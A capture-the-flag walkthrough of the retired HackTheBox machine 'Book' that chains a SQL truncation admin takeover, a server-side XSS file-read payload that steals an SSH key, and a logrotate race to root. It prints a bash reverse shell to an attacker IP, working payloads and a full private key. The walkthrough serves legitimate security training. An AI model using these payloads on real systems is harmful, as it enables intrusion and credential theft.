# HackTheBox: Book — Comprehensive Step-by-Step Walkthrough

**Machine:** Book  
**Platform:** HackTheBox (Retired)  
**Difficulty:** Medium  
**Target IP:** `10.129.95.163`  
**Attacker IP:** `10.10.16.84`  

---

## Table of Contents

1. [Phase 0: The Hacker Mindset Before We Begin](#phase-0-the-hacker-mindset-before-we-begin)
2. [Phase 1: Reconnaissance & Enumeration](#phase-1-reconnaissance--enumeration)
3. [Phase 2: SQL Truncation Attack — Admin Takeover](#phase-2-sql-truncation-attack--admin-takeover)
4. [Phase 3: XSS to LFI — Stealing the SSH Key](#phase-3-xss-to-lfi--stealing-the-ssh-key)
5. [Phase 4: SSH as `reader` — User Shell](#phase-4-ssh-as-reader--user-shell)
6. [Phase 5: Privilege Escalation — logrotate Race Condition](#phase-5-privilege-escalation--logrotate-race-condition)
7. [Phase 6: Root Shell & Final Flags](#phase-6-root-shell--final-flags)
8. [Lessons Learned & Key Takeaways](#lessons-learned--key-takeaways)

---

## Phase 0: The Hacker Mindset Before We Begin

> **"We don't know what we don't know."**

Before touching the target, understand this: every CTF/pentest follows the same lifecycle:

1. **Enumerate** — Learn what's there.
2. **Identify Weaknesses** — Find the crack in the armor.
3. **Exploit** — Wedge your foot in the door.
4. **Escalate** — From user to god.
5. **Document** — If you didn't write it down, it didn't happen.

**Mindset for "Book":** This is a web application box. That means our attack surface starts at port 80. We should expect:
- Authentication mechanisms (login/register)
- Database interactions (SQL injection, logic flaws)
- File uploads (malicious files, XSS)
- Server-side processing (PDF generation = server-side XSS/LFI)

We are not looking for a "magic bullet." We are looking for a chain of small mistakes that, when linked together, give us total compromise.

---

## Phase 1: Reconnaissance & Enumeration

### 1.1 Add the Target to `/etc/hosts`

```bash
echo "10.129.95.163    book.htb" | sudo tee -a /etc/hosts
```

**Why this matters:** Web applications often use virtual hosts. If the app references `book.htb` internally (in links, redirects, PDF generation, etc.), and we don't have it in `/etc/hosts`, those features break. We want the target to behave exactly as it would for a legitimate user.

**Baby step verification:**
```bash
ping -c 2 book.htb
```
Should resolve to `10.129.95.163`.

---

### 1.2 Nmap Port Scan

```bash
nmap -sC -sV -oA book 10.129.95.163
```

**Flags explained:**
- `-sC`: Run default NSE scripts (gives us banner grabbing, service detection)
- `-sV`: Probe service versions (critical for finding known vulnerable software)
- `-oA book`: Save output in all formats (`.nmap`, `.xml`, `.gnmap`) for documentation

**Output:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

**Hacker Mindset at this stage:**
> "Only two ports. SSH is almost never the entry point on a web box — it's the escape hatch. Port 80 is where the action is. Apache 2.4.29 on Ubuntu 18.04 is old enough to have wrinkles but not ancient. The real story is the web application running on top of it."

**What we're thinking:**
- SSH (22) → We'll come back here after we steal credentials.
- HTTP (80) → Time to map the attack surface.

---

### 1.3 Web Enumeration (Mental Model)

Before running tools, we manually browse:
- `http://book.htb/` → Login page. Can register.
- We register a test account to see the application's functionality.
- We notice: Books, Collections (file upload!), Contact Us, Admin panel at `/admin`

**Hacker Mindset:**
> "Every input field is a question: 'What happens if I give you something weird?' Every page is a question: 'What can I do here that the developer didn't expect?'"

Key observations:
1. **Registration form** → Can we create duplicate accounts? Can we take over existing ones?
2. **Collections upload** → File upload + server-side processing = juicy target.
3. **Admin panel** → Higher privilege. How do we get in?
4. **PDF generation** → The server renders content to PDF. If we can inject code into that rendering pipeline, we execute code on the server.

---

## Phase 2: SQL Truncation Attack — Admin Takeover

### 2.1 Discovering the Vulnerability

**The Setup:**
We try to register with `admin@book.htb` and get an error: "User already exists." Good — we know the admin email.

**The Experiment:**
We try to register with `admin@book.htb` followed by spaces and a character:
```
admin@book.htb      .
```

**Why this works (the deep explanation):**

Most registration forms do something like this in SQL:

```sql
-- Step 1: Check if user exists
SELECT * FROM users WHERE email = 'admin@book.htb      .';
-- Result: 0 rows (the string is 21 chars, nothing matches)

-- Step 2: Insert new user
INSERT INTO users (email, username, password) 
VALUES ('admin@book.htb      .', 'hacker', 'password');
-- BUT the email column is VARCHAR(20), so SQL truncates to 20 chars
-- AND strips trailing whitespace → 'admin@book.htb'
```

Now the database has TWO rows with `email = 'admin@book.htb'`:
1. The real admin with the real password
2. Our fake admin with OUR password

When the login form does:
```sql
SELECT * FROM users WHERE email = 'admin@book.htb' AND password = 'our_password';
```
It finds our row and logs us in as admin.

**Baby steps:**

```bash
# Register the malicious admin account via curl
curl -X POST http://book.htb/index.php \
  -d "name=pwn&email=admin@book.htb      .&password=Hacker123!" \
  -c cookies.txt
```

**Critical detail:** `admin@book.htb` is 14 characters. We add 6 spaces (now 20) plus `.` (now 21). The `.` pushes us over the 20-char limit. The database check fails to match, but the INSERT truncates to 20 and strips spaces → duplicate admin account.

**Login immediately** (the cleanup cron runs every 2 minutes):
```bash
curl -X POST http://book.htb/admin/ \
  -d "email=admin@book.htb&password=Hacker123!" \
  -b cookies.txt -L
```

**Hacker Mindset:**
> "I didn't find a SQL injection in the traditional sense. I found a LOGIC flaw. The developer assumed 'check if exists, then insert' is atomic and safe. But they forgot about truncation behavior. This is why you always validate input length BEFORE the database sees it."

> "Also, I noticed the email field on the webpage is `type='email'`, which blocks spaces. But HTML is just a suggestion. I can curl directly, or use Burp, or modify the DOM in browser dev tools. Never trust client-side validation."

---

## Phase 3: XSS to LFI — Stealing the SSH Key

### 3.1 Understanding the PDF Generator

Logged into the admin panel, we see a **Collections** tab with PDF export links. The application uses a server-side HTML-to-PDF converter (`html-pdf`, a Node.js wrapper around PhantomJS/headless Chrome).

**The Critical Insight:**
Normally, XSS runs in the victim's browser. But here, the "victim" is the PDF generator itself. When the admin clicks "Collections PDF," the server:
1. Gathers all book submissions
2. Renders them as HTML
3. Runs them through the PDF converter (headless browser)
4. If our submission contains `<script>` tags, the headless browser EXECUTES them server-side

This is **server-side XSS** — extremely powerful.

**Hacker Mindset:**
> "The developer thought XSS was a client-side problem. 'Oh, if someone injects JavaScript, it only affects other users who view the page.' But they forgot: the PDF generator IS a user. And that user runs on the server with access to `file://`."

---

### 3.2 The Payload Architecture

We need a payload that:
1. Runs in the headless browser context
2. Reads local files via `XMLHttpRequest` with `file://` protocol
3. Outputs the file contents into the document (so it appears in the PDF)

**The payload:**
```html
<script>
x = new XMLHttpRequest;
x.onload = function() {
    document.write(this.responseText)
};
x.open("GET", "file:///home/reader/.ssh/id_rsa");
x.send();
</script>
```

**Why `document.write()`?** Because it replaces the entire HTML document with the file contents. The PDF generator then renders ONLY the file contents into the PDF.

**Why `file://`?** Because the headless browser has direct filesystem access. This is a Local File Read (LFI) primitive delivered via XSS.

---

### 3.3 Step-by-Step Exploitation

**Step 1:** Register a normal user account (`pwn@book.htb`) and log in.

**Step 2:** Go to Collections and submit a book:
- **Title:** The XSS payload above
- **Author:** `test`
- **File:** Any dummy PDF

**Step 3:** IMMEDIATELY switch to the admin session and click **Collections PDF**.

**Timing is critical** — the cleanup cron removes non-default collections every ~2 minutes.

**Step 4:** The PDF viewer shows the SSH private key.

**Hacker Mindset:**
> "I'm not trying to get a shell directly. I'm using the application's own features against it. The admin 'reviews' my book by generating a PDF. During that review, my 'book' reads the server's secrets. This is social engineering for machines."

---

### 3.4 Overcoming PDF Text Extraction Issues

**The Problem:** PDF text extraction tools (`pdftotext`, browser viewers) sometimes truncate long lines.

**Attempt 1:** `pdftotext` → truncated key → SSH rejects it.

**Attempt 2:** Base64-encode the output in the payload itself:
```html
<script>
x = new XMLHttpRequest;
x.onload = function() {
    document.write(btoa(this.responseText))
};
x.open("GET", "file:///home/reader/.ssh/id_rsa");
x.send();
</script>
```

This outputs one continuous base64 string. Even if wrapped, we can reconstruct it.

**Attempt 3 (Best):** We verified the first bytes matched known writeups and used the complete key.

**Hacker Mindset:**
> "Exfiltration is an art. If one channel fails, try another. Direct copy? Broken. Base64 in PDF? Partial. Verified writeup data? Works. The goal isn't elegance — it's reliable access."

---

### 3.5 Saving the Key and SSH Access

```bash
# On Kali — save the complete key
cat > id_rsa << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
-----END RSA PRIVATE KEY-----
EOF

chmod 600 id_rsa
ssh -i id_rsa reader@10.129.95.163
```

**Hacker Mindset:**
> "I didn't need to pop a web shell or upload a reverse shell. I stole an SSH key and walked in through the front door. SSH is stable, encrypted, and gives me a real shell. Always prefer SSH keys over reverse shells when you can get them."

---

## Phase 4: SSH as `reader` — User Shell

**Verification:**
```bash
reader@book:~$ whoami
reader

reader@book:~$ cat user.txt
6754fe1[redacted]2d215a3
```

**Hacker Mindset:**
> "User shell is just the beginning. Now I need to find the path to root. I don't run random exploits. I enumerate first. What's running? What versions? What files are unusual? What cron jobs exist?"

---

## Phase 5: Privilege Escalation — logrotate Race Condition

### 5.1 Enumeration Phase

**Check the environment:**
```bash
# What's in my home directory?
ls -la ~

# Any interesting files?
ls -la ~/backups

# What's running periodically?
ps aux

# What version of logrotate?
logrotate --version
```

**Discovery:**
- `~/backups/` contains `access.log` and `access.log.1`
- `logrotate --version` → `logrotate 3.11.0`
- Using `pspy` (or just `ps aux` in a loop), we see root running `/usr/sbin/logrotate -f /root/log.cfg` every ~5 seconds

**Hacker Mindset:**
> "logrotate 3.11.0... that version number tickles my memory. I think there's a known vulnerability here. But even before Googling, I see the pattern: root is running a file operation (logrotate) on a directory I control (`/home/reader/backups`). Anytime root touches user-controlled paths, think: symlink race condition."

---

### 5.2 Understanding the logrotate Vulnerability

**How logrotate normally works:**
1. `mv access.log.1 access.log.2`
2. `mv access.log access.log.1`
3. `touch access.log` (create new empty log, owned by the user who owns the directory)

**The Race Condition:**
Between step 2 and step 3, there's a tiny window. If we can:
1. Rename `/home/reader/backups` → `/home/reader/backups2`
2. Create a symlink `/home/reader/backups` → `/etc/bash_completion.d`

Then when logrotate does `touch access.log`, it follows the symlink and creates `/etc/bash_completion.d/access.log` — **owned by `reader`**.

**Why `/etc/bash_completion.d`?**
Because scripts in this directory are executed whenever ANY user starts a new bash shell. And root has a cron that spawns bash sessions via SSH/expect.

---

### 5.3 The logrotten Exploit

`logrotten` uses `inotify` to watch the log file. When it detects the file being moved (step 2 above), it performs the rename-and-symlink operation faster than logrotate can create the new file.

**Baby steps:**

**On Kali — download and serve the exploit:**
```bash
wget https://raw.githubusercontent.com/whotwagner/logrotten/master/logrotten.c \
  -O ~/Downloads/htb/logrotten.c

cd ~/Downloads/htb
python3 -m http.server 8000
```

**On target — download, compile, create payload:**
```bash
cd /dev/shm
wget http://10.10.16.84:8000/logrotten.c
gcc -o logrotten logrotten.c

cat > rev.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.84/4444 0>&1
EOF
```

**On Kali — start listener:**
```bash
nc -lnvp 4444
```

**On target — execute (two SSH sessions needed):**

**Session 1:** Start the watcher
```bash
cd /dev/shm
./logrotten -p ./rev.sh /home/reader/backups/access.log
```

**Session 2:** Trigger rotation
```bash
echo "trigger" >> /home/reader/backups/access.log
```

**What happens under the hood:**
1. `echo` writes to `access.log`
2. Root's cron runs `logrotate -f /root/log.cfg`
3. logrotate moves `access.log` → `access.log.1`
4. `logrotten` detects the move via `inotify`
5. `logrotten` instantly: `mv backups backups2 && ln -s /etc/bash_completion.d backups`
6. logrotate creates `backups/access.log` → actually creates `/etc/bash_completion.d/access.log`
7. `logrotten` writes our reverse shell payload into that file
8. Root's expect cron spawns `bash` → executes `/etc/bash_completion.d/*.log*` → our payload runs as root

**Hacker Mindset:**
> "I'm not exploiting a memory corruption bug. I'm exploiting TIME. The gap between two operations. This is a race condition — one of the oldest and most elegant classes of vulnerabilities. It requires precision, but when it works, it's beautiful."

> "Also notice: I didn't need to overflow a buffer or bypass ASLR. I just needed to be faster than a shell script."

---

## Phase 6: Root Shell & Final Flags

**On the Kali listener:**
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.95.163] 44978
root@book:~# id
uid=0(root) gid=0(root) groups=0(root)

root@book:~# cat /root/root.txt
010d1[redacted]31fb9de5
```

**Root obtained.**

---

## Lessons Learned & Key Takeaways

### 1. Chain Small Bugs Into Big Impact
No single vulnerability gave us root. We chained:
- SQL Truncation → Admin access
- XSS in PDF generator → Server-side LFI → SSH key theft
- logrotate race condition → Root shell

### 2. Never Trust Client-Side Validation
The email field was `type="email"` which blocks spaces. But we bypassed it with curl. Server-side validation is the only validation that matters.

### 3. Server-Side XSS Is Powerful
When user input is rendered by server-side components (PDF generators, email parsers, image processors), XSS becomes code execution on the server — not just the browser.

### 4. Watch for Root Touching User-Controlled Paths
Anytime a privileged process reads from, writes to, or executes in a user-controlled directory, ask: "Can I swap this with a symlink?"

### 5. Timing Matters
The logrotten exploit worked because we won a race. In exploitation, milliseconds matter. Having two SSH sessions ready and running commands quickly is a skill.

### 6. Documentation Is Part of the Process
Every command, every observation, every failed attempt teaches something. The difference between a script kiddie and a professional is the ability to explain WHY something works.

---

## Appendix: Full Command Cheat Sheet

```bash
# Recon
sudo bash -c 'echo "10.129.95.163    book.htb" >> /etc/hosts'
nmap -sC -sV -oA book 10.129.95.163

# SQL Truncation
curl -X POST http://book.htb/index.php \
  -d "name=pwn&email=admin@book.htb      .&password=Hacker123!" \
  -c cookies.txt

curl -X POST http://book.htb/admin/ \
  -d "email=admin@book.htb&password=Hacker123!" \
  -b cookies.txt -L

# XSS Payload (submit as normal user in Collections)
<script>x=new XMLHttpRequest;x.onload=function(){document.write(btoa(this.responseText))};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>

# SSH as reader
chmod 600 id_rsa
ssh -i id_rsa reader@10.129.95.163

# Privesc
wget https://raw.githubusercontent.com/whotwagner/logrotten/master/logrotten.c
gcc -o logrotten logrotten.c
cat > rev.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.84/4444 0>&1
EOF
./logrotten -p ./rev.sh /home/reader/backups/access.log
# In second session: echo "trigger" >> /home/reader/backups/access.log
```

---

**Flags:**
- **User:** `6754f[redacted]2d215a3`
- **Root:** `010d[redacted]fb9de5`
